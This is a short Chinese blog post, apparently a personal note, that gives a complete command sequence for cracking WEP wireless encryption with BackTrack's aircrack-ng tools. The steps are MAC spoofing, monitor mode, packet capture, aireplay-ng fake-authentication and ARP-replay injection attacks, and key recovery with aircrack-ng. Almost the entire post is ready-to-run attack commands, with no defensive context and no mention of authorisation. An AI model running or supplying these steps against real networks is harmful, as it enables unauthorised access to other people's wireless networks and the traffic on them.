---
layout: post
title: "BackTrack破解无线网络WEP加密"
description: ""
category: get 
tags: [BackTrack]
---
{% include JB/setup %}

> 这只是一则笔记...

### 查看无线网卡信息
iwconfig
ifconfig -a

### 停止无线网卡
ifdown (interface)
ifdown wlan0

### 伪装MAC地址
macchanger –mac 11:22:33:44:55:66 (interface)
macchanger –mac 11:22:33:44:55:66 wlan0

### 开启无线网卡monitor模式
airmon-ng start (interface)
airmon-ng start wlan0

### 查看附近无线网络信息
airmon-ng (new interface)
airodump-ng mon0

### 对某无线网络抓包 (保留此窗口，名为"窗口D")
airodump-ng -c (channel) -w (dump-name) –bssid (BSSID) (new interface)
airodump-ng -c 6 -w network.out –bssid (BSSID的MAC) mon0

### 攻击测试，等待成功字样，成功后继续；如果没有返回，可能由于信号不好
aireplay-ng -1 0 -a (BSSID) -h (faked:mac) -e (essid) (new interface)
aireplay-ng -1 0 -a (BSSID的MAC) -h 11:22:33:44:55:66 mon0

### 开始攻击，观察"窗口D"的 #Data 的值的变化，通常等待3-5分钟，#Data 值将快速增加
aireplay-ng -3 -b (bssid) -h (faked:mac) (new interface)
aireplay-ng -3 -b (BSSID的MAC) -h 11:22:33:44:55:66 mon0

### 如果上面的命令没有导致#Data增加则尝试此命令
aireplay-ng -2 -F -p 0841 -c FF:FF:FF:FF:FF:FF -b (bssid) -h 11:22:33:44:55:66 (new interface)
aireplay-ng -2 -F -p 0841 -c ff:ff:ff:ff:ff:ff -b (BSSID的MAC) -h 11:22:33:44:55:66 mon0

### 当 #Data 达到5000可以开始破解
aircrack-ng -n (64/128) -b (BSSID) (dump-name)-01.cap
aircrack-ng -n 128 -b (BSSID的MAC) network.out-01.cap

### 破解完成需要停止网卡monitor模式，或者重启
airmon-ng stop mon0